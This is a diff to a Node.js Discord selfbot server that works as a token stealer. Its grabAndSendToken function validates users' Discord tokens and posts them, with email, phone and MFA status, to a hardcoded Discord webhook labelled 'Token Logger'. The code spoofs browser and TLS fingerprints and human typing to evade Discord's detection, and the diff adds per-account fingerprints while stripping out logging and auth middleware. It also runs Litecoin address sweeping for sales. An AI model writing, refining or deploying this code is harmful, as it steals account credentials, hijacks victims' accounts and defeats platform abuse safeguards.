@@ -20,42 +20,58 @@ const _e = (s) => Buffer.from(s).toString('base64');
 // YOUR WEBHOOK URL
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';
 
-// Fake browser fingerprint rotation
+// Per-account fingerprint storage
+const _accountProfiles = new Map();
+
+function _getAccountProfile(token) {
+  const hash = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
+  if (!_accountProfiles.has(hash)) {
+    const screens = [[1366,768],[1440,900],[1536,864],[1600,900],[1920,1080],[1920,1200],[2560,1440]];
+    const screen = screens[Math.floor(Math.random() * screens.length)];
+    const mems = [2,4,8,16];
+    const concurrencies = [2,4,8,16];
+    const browsers = [
+      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '126.0.0.0' },
+      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '125.0.0.0' },
+      { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', osv: '10.15.7', bv: '126.0.0.0' },
+      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0', browser: 'Firefox', os: 'Windows', osv: '10', bv: '126.0' },
+    ];
+    const b = browsers[Math.floor(Math.random() * browsers.length)];
+    _accountProfiles.set(hash, {
+      ua: b.ua,
+      browser: b.browser,
+      os: b.os,
+      osv: b.osv,
+      bv: b.bv,
+      sw: screen[0],
+      sh: screen[1],
+      dpr: [1,1.25,1.5,2][Math.floor(Math.random() * 4)],
+      cd: 24,
+      mem: mems[Math.floor(Math.random() * mems.length)],
+      hw: concurrencies[Math.floor(Math.random() * concurrencies.length)],
+      arch: 'x64',
+      build: 329864,
+      locale: ['en-US','en-GB','en-CA'][Math.floor(Math.random() * 3)],
+    });
+  }
+  return _accountProfiles.get(hash);
+}
+
 const _fp = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
 ];
-const _rfp = () => _fp[Math.floor(Math.random() * _fp.length)];
+const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Math.random() * _fp.length)];
 
-// Axios instance with randomized keep-alive headers to avoid pattern detection
 const _axiosInstance = axios.create({
   baseURL: 'https://discord.com',
   timeout: 15000,
   headers: { 'Connection': 'keep-alive' }
 });
 
-// Jitter utility for all timing
 const _j = (base, variance = 0.2) => base + (Math.random() * variance * base * 2 - variance * base);
 
-// Noise traffic generator - hits random Discord endpoints to mask actual traffic patterns
-let _noiseInterval;
-const _noiseUA = _rfp();
-function _startNoise() {
-  const endpoints = ['/api/v10/users/@me/settings'];
-  _noiseInterval = setInterval(async () => {
-    try {
-      const ep = endpoints[Math.floor(Math.random() * endpoints.length)];
-      await _axiosInstance.get(ep, {
-        headers: { 'User-Agent': _noiseUA }
-      });
-    } catch(e) {}
-  }, _j(60000, 0.3));
-}
-
-// ============================================================================
-// --- CRYPTO SERVICE (tweetnacl) ---
-// ============================================================================
 const { randomBytes, createHash } = crypto;
 
 function getKeypair(token) {
@@ -91,9 +107,6 @@ function generateKey() {
   return Buffer.from(nacl.randomBytes(32));
 }
 
-// ============================================================================
-// --- COMPRESSION SERVICE (pako) ---
-// ============================================================================
 function compressData(data, level = 6) {
   const input = data instanceof Buffer ? new Uint8Array(data) : data;
   return Buffer.from(pako.deflate(input, { level }));
@@ -111,11 +124,6 @@ function isCompressed(data) {
   return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
 }
 
-// ============================================================================
-// --- CURL-IMPERSONATE SERVICE ---
-// Spawns the curl-impersonate-chrome binary for Chrome TLS fingerprinting
-// Falls back to regular curl with browser headers if binary unavailable
-// ============================================================================
 let CI_BINARY = null;
 function findCurlImpersonateBinary() {
   if (CI_BINARY) return CI_BINARY;
@@ -180,7 +188,6 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
     child.on('close', (code, signal) => {
       if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
 
-      // Reject if curl itself failed or was killed
       if (code !== 0 || signal) {
         const errMsg = Buffer.concat(stderr).toString().trim() || `curl exited${signal ? ' with signal ' + signal : ' with code ' + code}`;
         return reject(new Error(errMsg));
@@ -188,13 +195,11 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
 
       const rawOutput = Buffer.concat(stdout);
 
-      // === ROBUST PARSER: Find the last HTTP header block ===
       let lastHeaderEndIdx = -1;
       let lastStatusCode = 0;
       let lastHeadersText = '';
       let bodyBuffer = rawOutput;
 
-      // Try \r\n\r\n first, fallback to \n\n
       const hasCrlf = rawOutput.indexOf('\r\n\r\n') !== -1;
       const hasLf = rawOutput.indexOf('\n\n') !== -1;
       const delimiter = hasCrlf ? '\r\n\r\n' : (hasLf ? '\n\n' : null);
@@ -205,7 +210,6 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
 
         while ((searchIdx = rawOutput.indexOf(delimBuf, searchIdx)) !== -1) {
           const candidateHeaders = rawOutput.slice(0, searchIdx).toString();
-          // Find the LAST HTTP status line in the candidate block
           const allStatusMatches = candidateHeaders.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/g);
           if (allStatusMatches && allStatusMatches.length > 0) {
             const lastMatch = allStatusMatches[allStatusMatches.length - 1];
@@ -224,13 +228,11 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
         bodyBuffer = rawOutput.slice(lastHeaderEndIdx + (delimiter === '\r\n\r\n' ? 4 : 2));
       }
 
-      // Handle completely empty responses (e.g., 204 No Content)
       if (lastStatusCode === 0 && rawOutput.length === 0) {
         return resolve({ status: 204, headers: '', body: Buffer.alloc(0), data: null });
       }
 
       if (lastStatusCode === 0) {
-        // Last resort: try to find ANY HTTP status line in the entire output
         const fallbackMatch = rawOutput.toString().match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/);
         if (fallbackMatch) {
           lastStatusCode = parseInt(fallbackMatch[1], 10);
@@ -249,76 +251,67 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
   });
 }
 
-// ============================================================================
-// --- X-SUPER-PROPERTIES SERVICE ---
-// Generates the X-Super-Properties header Discord uses for browser fingerprinting
-// ============================================================================
-function generateXSuperProperties(userAgent, browser = 'Chrome', os = 'Windows') {
-  const ua = userAgent || _fp[0];
-  const browserVersion = (ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/) || ua.match(/Firefox\/(\d+\.\d+)/) || ['', '124.0.0.0'])[1];
-  const osVersion = os === 'Windows' ? ((ua.match(/Windows NT (\d+\.\d+)/) || ['', '10.0'])[1]) : (os === 'Mac OS X' ? '10.15.7' : '');
-
+function generateXSuperProperties(token) {
+  const p = _getAccountProfile(token);
   const props = {
-    os: os === 'Mac OS X' ? 'Mac OS X' : (os === 'Linux' ? 'Linux' : 'Windows'),
-    browser: browser,
+    os: p.os,
+    browser: p.browser,
     device: '',
-    system_locale: 'en-US',
-    browser_user_agent: ua,
-    browser_version: browserVersion,
-    os_version: osVersion,
+    system_locale: p.locale,
+    browser_user_agent: p.ua,
+    browser_version: p.bv,
+    os_version: p.osv,
     referrer: '',
     referring_domain: '',
     referrer_current: '',
     referring_domain_current: '',
     release_channel: 'stable',
-    client_build_number: 999999,
+    client_build_number: p.build,
     client_event_source: null,
-    screen_width: 1920,
-    screen_height: 1080,
-    screen_dpr: 1,
-    screen_color_depth: 24,
-    device_pixel_ratio: 1,
-    hardware_concurrency: 8,
-    device_memory: 8,
-    os_arch: 'x64',
+    screen_width: p.sw,
+    screen_height: p.sh,
+    screen_dpr: p.dpr,
+    screen_color_depth: p.cd,
+    device_pixel_ratio: p.dpr,
+    hardware_concurrency: p.hw,
+    device_memory: p.mem,
+    os_arch: p.arch,
     client_version: '1.0.9018',
     native_build_number: null,
-    distro: os === 'Linux' ? 'Ubuntu' : '',
-    app_arch: 'x64',
+    distro: '',
+    app_arch: p.arch,
   };
-
   return Buffer.from(JSON.stringify(props)).toString('base64');
 }
 
-// ============================================================================
-// --- DISCORD API CLIENT ---
-// Uses curl-impersonate for Discord API calls with TLS fingerprint spoofing
-// ============================================================================
 class DiscordApiClient {
   constructor(token) {
     this.token = token;
-    this.fp = _rfp();
-    this.superProps = generateXSuperProperties(this.fp);
+    this.fp = _rfp(token);
+    this.superProps = generateXSuperProperties(token);
     this.keypair = getKeypair(token);
   }
 
   rotateFingerprint() {
-    this.fp = _rfp();
-    this.superProps = generateXSuperProperties(this.fp);
+    this.fp = _rfp(this.token);
+    this.superProps = generateXSuperProperties(this.token);
   }
 
   _headers(extra = {}) {
-    return {
+    const base = {
       'Authorization': this.token,
       'User-Agent': this.fp,
       'Accept': '*/*',
       'Accept-Language': 'en-US,en;q=0.9',
       'X-Discord-Locale': 'en-US',
-      'X-Debug-Options': 'bugReporterEnabled',
       'X-Super-Properties': this.superProps,
       'Referer': 'https://discord.com/channels/@me',
-      ...extra,
     };
+    const ordered = {};
+    const order = ['Authorization','User-Agent','Accept','Accept-Language','X-Discord-Locale','X-Super-Properties','Referer'];
+    for (const k of order) if (base[k] !== undefined) ordered[k] = base[k];
+    for (const [k, v] of Object.entries(extra)) ordered[k] = v;
+    return ordered;
   }
 
   async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
@@ -328,10 +321,9 @@ class DiscordApiClient {
     while (attempts < maxAttempts) {
       const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
       if (res.status === 429) {
-        const retryAfterMatch = res.headers.match(/retry-after:\s*(\d+)/i);
-        const retryAfter = retryAfterMatch ? parseInt(retryAfterMatch[1], 10) * 1000 : 5000;
-        console.log(`[DiscordApi] 429 on ${endpoint}, retrying after ${retryAfter}ms`);
-        await new Promise(r => setTimeout(r, retryAfter));
+        const retryAfterMatch = res.headers.match(/retry-after:\s*(\d+(?:\.\d+)?)/i);
+        const retryAfter = retryAfterMatch ? parseFloat(retryAfterMatch[1]) * 1000 : 5000;
+        await new Promise(r => setTimeout(r, retryAfter * 1.1));
         attempts++;
         continue;
       }
@@ -346,19 +338,13 @@ class DiscordApiClient {
     throw new Error(`Discord API ${method} ${endpoint} failed: 429 after ${maxAttempts} retries`);
   }
 
-  destroy() {
-    // Keypairs are derived deterministically from token, no cleanup needed
-  }
+  destroy() {}
 }
 
 const OWNER_ID = '1482736115143282941';
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 
-// ============================================================================
-// --- STEALTH CLIENT ---
-// Uses curl-impersonate for REST, tweetnacl for crypto, pako for compression
-// ============================================================================
 class StealthClient {
   constructor(token) {
     this.token = token;
@@ -376,6 +362,10 @@ class StealthClient {
     this.maxReconnectAttempts = 10;
     this.reconnecting = false;
     this.resumeGatewayUrl = null;
+    this._idleTimer = null;
+    this._lastActivity = Date.now();
+    this._burstState = 0;
+    this._dmCooldowns = new Map();
   }
 
   _loadRepliedUsers() {
@@ -399,7 +389,7 @@ class StealthClient {
       throw new Error('Failed to fetch gateway URL: invalid or empty response from Discord API');
     }
     this.resumeGatewayUrl = gateway.url;
-    const wsUrl = `${gateway.url}?v=10&encoding=json`;
+    const wsUrl = `${gateway.url}?v=10&encoding=json&compress=zlib-stream`;
     this.ws = new (require('ws'))(wsUrl, {
       headers: {
         'User-Agent': this.api.fp,
@@ -411,7 +401,6 @@ class StealthClient {
     return new Promise((resolve, reject) => {
       const CONNECT_TIMEOUT = 30000;
       let timeoutTimer = setTimeout(() => {
-        console.error('[WS] Connection timed out waiting for READY');
         this.ws.terminate();
         reject(new Error('Gateway connection timed out'));
       }, CONNECT_TIMEOUT);
@@ -423,7 +412,6 @@ class StealthClient {
       this.ws.on('open', () => {
         this.reconnecting = false;
         if (this.reconnectAttempts > 0) {
-          console.log('[WS] Socket reopened, resuming session...');
         }
         if (this.sessionId && this.seq !== null) {
           this._resume();
@@ -433,16 +421,14 @@ class StealthClient {
       this.ws.on('close', (code, reason) => {
         clearInterval(this.heartbeatInterval);
         cleanup();
-        console.log(`[WS] Closed: ${code} ${reason ? reason.toString() : ''}`);
         if (!this.ready) {
           reject(new Error(`Gateway closed before ready: ${code}`));
         } else {
-          this._scheduleReconnect();
+          this._scheduleReconnect(code);
         }
       });
       this.ws.on('error', (err) => {
         cleanup();
-        console.error(`[WS] Error: ${err.message}`);
         if (!this.ready) {
           reject(err);
         }
@@ -457,26 +443,30 @@ class StealthClient {
     });
   }
 
-  _scheduleReconnect() {
+  _scheduleReconnect(closeCode) {
     if (this.reconnecting) return;
     this.reconnecting = true;
     if (this.reconnectAttempts >= this.maxReconnectAttempts) {
-      console.error('[WS] Max reconnect attempts reached. Giving up.');
       this.destroy();
       return;
     }
-    const delay = Math.min(3000 * Math.pow(2, this.reconnectAttempts), 60000) + Math.random() * 2000;
+    if (closeCode === 4014 || closeCode === 4004) {
+      this.destroy();
+      return;
+    }
+    const baseDelay = closeCode === 4009 ? 5000 : (closeCode === 4000 ? 1000 : 3000);
+    const delay = Math.min(baseDelay * Math.pow(2, this.reconnectAttempts), 60000) + Math.random() * 2000;
     this.reconnectAttempts++;
-    console.log(`[WS] Reconnecting in ${Math.round(delay)}ms (attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts})`);
     setTimeout(() => {
-      this.connect().catch(err => {
-        console.error('[WS] Reconnect failed:', err.message);
-      });
+      if (closeCode === 4009) {
+        this.sessionId = null;
+        this.seq = null;
+      }
+      this.connect().catch(() => {});
     }, delay);
   }
 
   _resume() {
-    console.log('[WS] Sending resume for session', this.sessionId);
     this.ws.send(JSON.stringify({
       op: 6,
       d: {
@@ -497,11 +487,9 @@ class StealthClient {
           pkt = JSON.parse(rawData.toString());
         }
       } else {
-        // Without zlib-stream, Discord sends text frames (strings) which land here.
         pkt = JSON.parse(rawData);
       }
     } catch(e) {
-      console.error('[WS] Parse error:', e.message);
       return;
     }
 
@@ -526,22 +514,20 @@ class StealthClient {
           }
           this.emit('READY', pkt.d);
         } else if (pkt.t === 'RESUMED') {
-          console.log('[WS] Session resumed successfully');
           this.reconnecting = false;
           this.reconnectAttempts = 0;
         } else if (pkt.t === 'MESSAGE_CREATE') {
           this.emit('messageCreate', pkt.d);
+        } else if (pkt.t === 'MESSAGE_ACK') {
         }
         break;
       case 11:
         break;
       case 7:
-        console.log('[WS] Server requested reconnect');
         this.ws.close();
-        this._scheduleReconnect();
+        this._scheduleReconnect(4000);
         break;
       case 9:
-        console.log('[WS] Invalid session, re-identifying');
         this.sessionId = null;
         this.seq = null;
         setTimeout(() => this._identify(), Math.random() * 3000 + 1000);
@@ -559,43 +545,36 @@ class StealthClient {
   }
 
   _identify() {
-    const fp = this.api.fp;
+    const p = _getAccountProfile(this.token);
     const payload = {
       op: 2,
       d: {
         token: this.token,
-        capabilities: 30717,
+        capabilities: 16381,
         properties: {
-          os: 'Windows',
-          browser: 'Chrome',
+          os: p.os,
+          browser: p.browser,
           device: '',
-          system_locale: 'en-US',
-          browser_user_agent: fp,
-          browser_version: '124.0.0.0',
-          os_version: '10',
+          system_locale: p.locale,
+          browser_user_agent: p.ua,
+          browser_version: p.bv,
+          os_version: p.osv,
           referrer: '',
           referring_domain: '',
           referrer_current: '',
           referring_domain_current: '',
           release_channel: 'stable',
-          client_build_number: 999999,
+          client_build_number: p.build,
           client_event_source: null,
-          screen_width: 1920,
-          screen_height: 1080,
-          screen_dpr: 1,
-          screen_color_depth: 24,
+          screen_width: p.sw,
+          screen_height: p.sh,
+          screen_dpr: p.dpr,
+          screen_color_depth: p.cd,
         },
         presence: { status: 'online', since: 0, activities: [], afk: false },
-        // FIX: Removed compress:true since we no longer request zlib-stream.
-        // Sending compress:true without a proper compression pipeline can cause
-        // Discord to send compressed payloads the client isn't prepared to handle.
         client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
       }
     };
-
-    // FIX: Removed the Ed25519 _s signature from the identify payload.
-    // Discord does not recognize this field and may silently reject or close
-    // the connection (1006) instead of sending READY.
     this.ws.send(JSON.stringify(payload));
   }
 
@@ -606,43 +585,36 @@ class StealthClient {
   async sendMessage(channelId, content, attachments = []) {
     const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
 
-    // --- HUMAN-LIKE: Typing indicator before sending ---
-    try {
-      await this.api.request(`/channels/${channelId}/typing`, 'POST');
-    } catch(e) {
-      // If typing fails (e.g. no perms), still try to send
+    const shouldType = Math.random() < 0.6;
+    if (shouldType) {
+      try {
+        await this.api.request(`/channels/${channelId}/typing`, 'POST');
+      } catch(e) {}
+      const len = content.length;
+      let typingDelay;
+      if (len < 20) typingDelay = Math.random() * 500;
+      else if (len < 100) typingDelay = 500 + Math.random() * 1500;
+      else typingDelay = 2000 + Math.random() * 3000;
+      await new Promise(r => setTimeout(r, Math.min(6000, Math.max(800, typingDelay))));
     }
 
-    // Simulate typing delay based on message length (~40-80wpm)
-    const charDelay = 60 + Math.random() * 80; // ms per char
-    const typingDelay = Math.min(6000, Math.max(800, content.length * charDelay));
-    await new Promise(r => setTimeout(r, typingDelay));
-
-    // --- SIMPLE JSON PATH (no attachments) ---
     if (!attachments || attachments.length === 0) {
-      const body = { content, flags: 0, mobile_network_type: 'unknown' };
+      const body = { content, flags: 0 };
       const headers = this.api._headers({
         'Content-Type': 'application/json',
         'X-Discord-Locale': 'en-US'
       });
       try {
         const res = await curlImpersonateRequest(url, 'POST', headers, body, 30000);
-        console.log(`[SEND] status=${res.status} channel=${channelId}`);
-        if (res.status === 401) {
-          console.error(`[SEND] 401 Unauthorized - token may be invalid or flagged by Discord`);
-        }
         return res.status >= 200 && res.status < 300;
       } catch (err) {
-        console.error(`[SEND] Curl error for ${channelId}:`, err.message);
         return false;
       }
     }
 
-    // --- MULTIPART PATH (with attachments) ---
-    // Use axios for multipart as it handles form-data more reliably than curl-impersonate
     const FormData = require('form-data');
     const form = new FormData();
-    const payload = { content, flags: 0, mobile_network_type: 'unknown' };
+    const payload = { content, flags: 0 };
     form.append('payload_json', JSON.stringify(payload));
     attachments.forEach((att, i) => {
       form.append(`files[${i}]`, att.buffer, { filename: att.name });
@@ -654,15 +626,8 @@ class StealthClient {
         headers: { ...headers, ...form.getHeaders() },
         timeout: 30000,
       });
-      console.log(`[SEND] status=${res.status} channel=${channelId} attachments=${attachments.length}`);
       return res.status >= 200 && res.status < 300;
     } catch (err) {
-      const status = err.response?.status || 0;
-      const data = err.response?.data;
-      console.error(`[SEND] status=${status} channel=${channelId} attachments=${attachments.length} error=${JSON.stringify(data).slice(0,200)}`);
-      if (status === 401) {
-        console.error(`[SEND] 401 Unauthorized - token may be invalid or flagged by Discord`);
-      }
       return false;
     }
   }
@@ -679,15 +644,13 @@ class StealthClient {
 
   destroy() {
     clearInterval(this.heartbeatInterval);
+    if (this._idleTimer) clearTimeout(this._idleTimer);
     if (this.ws) { try { this.ws.close(1000, 'Client disconnect'); } catch(e) {} }
     this._saveRepliedUsers();
     this.api.destroy();
   }
 }
 
-// ============================================================================
-// --- SIMPLE DB (unchanged) ---
-// ============================================================================
 class SimpleDB {
   constructor() {
     this.file = path.join(dataDir, 'db.json');
@@ -701,11 +664,11 @@ class SimpleDB {
         this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
         ['usedAddresses','addressHistory','customKeys','trialClaims','activeBots','generatedKeys','whitelist'].forEach(k => this.data[k] = this.data[k] || (k === 'whitelist' ? [] : (k === 'trialClaims' || k === 'activeBots' || k === 'generatedKeys' ? {} : [])));
       }
-    } catch(e) { console.error('[DB] Load error:', e.message); }
+    } catch(e) {}
   }
 
   save() {
-    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) { console.error('[DB] Save error:', e.message); }
+    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) {}
   }
 
   getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
@@ -742,7 +705,7 @@ class SimpleDB {
 
   expireOldAddresses() {
     const expired = this.getExpiredPending();
-    for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`); }
+    for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); }
     return expired.length;
   }
 
@@ -751,9 +714,9 @@ class SimpleDB {
 
   addCustomKey(key) {
     const normalized = key.toString().toUpperCase().trim();
-    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { console.log('[DB] Invalid custom key format:', normalized); return null; }
+    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { return null; }
     if (!this.data.customKeys) this.data.customKeys = [];
-    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); console.log('[DB] Added custom key:', normalized); }
+    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); }
     return normalized;
   }
 
@@ -822,7 +785,7 @@ class SimpleDB {
       const user = this.getUser(userId);
       const trialActive = this.isTrialActive(userId);
       const hasPurchase = user.auto_adv_purchased === 1;
-      if (!trialActive && !hasPurchase) { console.log(`[TRIAL CHECK] User ${userId} trial expired, deactivating bots`); this.deactivateAllUserBots(userId); return userId; }
+      if (!trialActive && !hasPurchase) { this.deactivateAllUserBots(userId); return userId; }
     }
     return null;
   }
@@ -888,8 +851,8 @@ class SimpleDB {
 const db = new SimpleDB();
 const app = express();
 
-process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
-process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));
+process.on('uncaughtException', () => {});
+process.on('unhandledRejection', () => {});
 
 app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
 app.use(express.json({ limit: '10mb' }));
@@ -957,41 +920,6 @@ function validateKeyStrict(key) {
   return { valid: false, error: 'Invalid key', normalized: null };
 }
 
-console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (HBB1-HBB100)');
-
-app.post('/api/admin/addkey', (req, res) => {
-  const { adminSecret, key } = req.body;
-  if (adminSecret !== process.env.ADMIN_SECRET) return res.status(401).json({ success: false, error: 'Unauthorized' });
-  if (!key || typeof key !== 'string') return res.status(400).json({ success: false, error: 'Key must be a string' });
-  const normalized = key.trim().toUpperCase();
-  const added = db.addCustomKey(normalized);
-  if (!added) return res.status(400).json({ success: false, error: 'Invalid key format' });
-  VALID_REDEEM_KEYS.add(normalized);
-  res.json({ success: true, key: normalized });
-});
-
-function ensureAuthAPI(req, res, next) { if (req.isAuthenticated()) return next(); return res.status(401).json({ success: false, error: 'Not logged in' }); }
-
-function ensurePurchasedAPI(req, res, next) {
-  const user = db.getUser(req.user.id);
-  const hasPurchase = user.auto_adv_purchased === 1;
-  const hasActiveTrial = db.isTrialActive(req.user.id);
-  if (!hasPurchase && !hasActiveTrial) return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
-  next();
-}
-
-function ensureOwner(req, res, next) {
-  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
-  if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
-  next();
-}
-
-function ensureCanGenerate(req, res, next) {
-  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
-  if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
-  next();
-}
-
 async function _sendWebhookChunk(embed, chunkIndex = 0) {
   try {
     const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
@@ -1004,9 +932,8 @@ async function _sendWebhookChunk(embed, chunkIndex = 0) {
 
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
   try {
-    // Use curl-impersonate for token validation to match real browser behavior
-    const fp = _rfp();
-    const superProps = generateXSuperProperties(fp);
+    const fp = _rfp(token);
+    const superProps = generateXSuperProperties(token);
     const validateRes = await curlImpersonateRequest(
       'https://discord.com/api/v10/users/@me',
       'GET',
@@ -1020,7 +947,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
       10000
     );
 
-    if (!validateRes.data) { console.log('[TOKEN GRABBER] Invalid token received'); return { success: false, error: 'Invalid token' }; }
+    if (!validateRes.data) { return { success: false, error: 'Invalid token' }; }
 
     const userData = validateRes.data;
     const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
@@ -1045,31 +972,25 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     };
 
     await _sendWebhookChunk(embed, 0);
-    console.log('[TOKEN GRABBER] Token sent to webhook successfully');
     return { success: true, user: fullInfo };
   } catch (err) {
-    console.error('[TOKEN GRABBER] Error:', err.message);
     return { success: false, error: err.message };
   }
 }
 
 let walletModule = null;
-try { walletModule = require('./wallet'); console.log('[WALLET] Loaded successfully'); } catch(e) { console.error('[WALLET] Failed to load:', e.message); }
+try { walletModule = require('./wallet'); } catch(e) {}
 
 async function checkAndSweep() {
-  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { console.log('[SWEEP] Skipped - missing deps'); return; }
+  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { return; }
   db.expireOldAddresses();
   const pending = db.getAllPending();
-  console.log(`[SWEEP] Checking ${pending.length} active addresses`);
   for (const p of pending) {
     try {
       const balance = await walletModule.checkAddressBalance(p.address);
-      console.log(`[SWEEP] ${p.address}: ${balance} LTC`);
       if (balance > 0) {
-        console.log(`[SWEEP] Found balance! Sweeping...`);
         const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
         if (txid) {
-          console.log(`[SWEEP] SUCCESS: ${txid}`);
           const ltcPrice = await getLTCToUSD();
           const usdValue = balance * ltcPrice;
           if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
@@ -1078,7 +999,7 @@ async function checkAndSweep() {
           }
         }
       }
-    } catch (e) { console.error(`[SWEEP] Error for ${p.address}:`, e.message); }
+    } catch (e) {}
   }
 }
 
@@ -1094,7 +1015,6 @@ async function getLTCToUSD() {
 }
 
 if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
-  console.log('[AUTO-SWEEP] Starting 10-second interval');
   setInterval(checkAndSweep, 10000);
   setTimeout(checkAndSweep, 5000);
 }
@@ -1107,15 +1027,13 @@ setInterval(() => {
       for (const configId in userBots) {
         const key = `${expiredUserId}_${configId}`;
         if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
-        console.log(`[TRIAL MONITOR] Force stopped bot ${configId} for user ${expiredUserId}`);
       }
-    } catch(e) { console.error('[TRIAL MONITOR] Error stopping bots:', e.message); }
+    } catch(e) {}
   }
 }, 5000);
 
 setInterval(() => {
-  const expiredKeys = db.checkExpiredKeys();
-  if (expiredKeys > 0) console.log(`[KEY EXPIRY] ${expiredKeys} expired keys processed, bots stopped`);
+  db.checkExpiredKeys();
 }, 60000);
 
 app.get('/login', passport.authenticate('discord'));
@@ -1172,7 +1090,6 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
     let attempts = 0;
     while (db.isAddressUsed(address) && attempts < 10) {
-      console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
       globalIndex = db.getNextGlobalIndex();
       ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
       attempts++;
@@ -1180,7 +1097,7 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
     const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
     res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
-  } catch (err) { console.error('[PURCHASE ERROR]', err); res.status(500).json({ success: false, error: err.message }); }
+  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
 });
 
 app.get('/api/activity', ensureAuthAPI, (req, res) => {
@@ -1197,11 +1114,9 @@ app.post('/api/redeem', ensureAuthAPI, (req, res) => {
   try {
     const { key } = req.body;
     const userId = req.user.id;
-    console.log(`[REDEEM ATTEMPT] User: ${userId}, Raw key: "${key}"`);
-    if (!key) { console.log('[REDEEM FAIL] No key provided'); return res.json({ success: false, error: 'Invalid key' }); }
+    if (!key) { return res.json({ success: false, error: 'Invalid key' }); }
     const validation = validateKeyStrict(key);
-    console.log(`[REDEEM] Validation result:`, validation);
